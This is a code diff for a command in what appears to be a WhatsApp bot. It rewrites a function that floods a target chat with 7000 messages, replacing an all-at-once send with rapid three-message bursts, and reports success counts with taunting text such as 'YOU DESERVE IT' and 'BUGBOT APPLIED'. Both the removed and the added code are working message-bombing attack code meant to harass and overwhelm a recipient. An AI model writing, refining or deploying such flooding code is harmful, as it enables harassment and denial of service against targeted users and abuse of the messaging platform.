@@ -1,72 +1,70 @@
 const { channelInfo } = require('../lib/messageConfig');
 
 async function sulexhCommand(sock, chatId, message) {
+
     try {
-        // Create array of message promises for massive BOOM effect - 7000 concurrent messages
-        const boomMessages = [];
-        
-        // Prepare 7000 messages for instant concurrent delivery
-        // Using immediate promise creation without any delays
-        for (let i = 0; i < 7000; i++) {
-            // Each message is created as an independent promise
-            // No await here - just queue them all up for simultaneous execution
-            const boomPromise = sock.sendMessage(chatId, { 
-                text: `💥 YOU DESERVE IT💥 #${i + 1}` 
-            }).catch((error) => {
-                // Silent error handling to prevent cascade failures
-                // Individual message failures won't stop the flood
-                console.log(`BOOM message ${i + 1} failed:`, error.message || error);
-                return { failed: true, index: i + 1 };
-            });
-            
-            boomMessages.push(boomPromise);
+
+        const totalMessages = 7000;
+        const text = "💥 BUGBOT APPLIED 💥";
+
+        console.log("🚀 Starting PRO burst flood...");
+
+        const startTime = Date.now();
+
+        const burstSize = 3;
+        const tasks = [];
+
+        // Ultra burst micro-wave flood engine
+        for (let i = 0; i < totalMessages; i += burstSize) {
+
+            for (let j = 0; j < burstSize && i + j < totalMessages; j++) {
+
+                tasks.push(
+                    sock.sendMessage(chatId, {
+                        text: text
+                    }).catch(err => {
+                        console.log("Send failed:", err.message || err);
+                        return false;
+                    })
+                );
+
+            }
+
+            // Tiny micro pause (almost invisible)
+            await new Promise(r => setTimeout(r, 3));
         }
 
-        // 🚀 NUCLEAR BOOM! Launch all 7000 messages simultaneously
-        // Promise.allSettled ensures all promises complete regardless of individual failures
-        // No delays, no throttling - maximum concurrent bombardment
-        console.log("🚀 Launching 7000 concurrent messages...");
-        const launchStartTime = Date.now();
-        
-        const boomResults = await Promise.allSettled(boomMessages);
-        
-        const launchEndTime = Date.now();
-        const totalLaunchTime = launchEndTime - launchStartTime;
+        const results = await Promise.all(tasks);
 
-        // Calculate success/failure statistics
-        const successfulHits = boomResults.filter(result => 
-            result.status === 'fulfilled' && 
-            result.value && 
-            !result.value.failed
-        ).length;
-        
-        const failedHits = 7000 - successfulHits;
+        const success = results.filter(r => r !== false).length;
+        const failed = totalMessages - success;
 
-        // Send confirmation with detailed statistics
+        const totalTime = Date.now() - startTime;
+
+        // Confirmation message ONLY in your inbox
         await sock.sendMessage(chatId, {
-            text: `💥💥💥 BUG HAS BEEN SENT SUCCESSFUL! 💥💥💥\n` +
-                  `📊 Statistics:\n` +
-                  `✅ Successful: ${successfulHits}/7000\n` +
-                  `❌ Failed: ${failedHits}/7000\n` +
-                  `⏱️ Total Time: ${totalLaunchTime}ms\n` +
-                  `🚀 Concurrent Execution: TRUE\n` +
-                  `💣 Bug Mode: ACTIVATED`,
+            text:
+                `💥 PRO BOOM COMPLETE 💥\n\n` +
+                `📊 Statistics\n` +
+                `✅ Sent: ${success}/${totalMessages}\n` +
+                `❌ Failed: ${failed}\n` +
+                `⚡ Mode: Ultra Burst Engine\n` +
+                `⏱ Time: ${totalTime}ms`,
             ...channelInfo
         }, { quoted: message });
 
-        console.log(`BOOM execution completed: ${successfulHits}/${7000} messages sent in ${totalLaunchTime}ms`);
+        console.log(`🚀 PRO flood finished → ${success}/${totalMessages}`);
 
     } catch (error) {
-        console.error("Critical BOOM command error:", error);
 
-        // Emergency fallback message
-        await sock.sendMessage(chatId, {
-            text: "❌💥 BOOM SYSTEM FAILURE - Could not execute 7000 message flood\n" +
-                  `Error: ${error.message || 'Unknown error occurred'}`,
-            ...channelInfo
-        }, { quoted: message }).catch(() => {
-            console.error("Failed to send error message - complete system failure");
-        });
+        console.log("Critical BOOM error:", error.message || error);
+
+        try {
+            await sock.sendMessage(chatId, {
+                text: "❌ BOOM ENGINE ERROR",
+                ...channelInfo
+            }, { quoted: message });
+        } catch {}
     }
 }
 
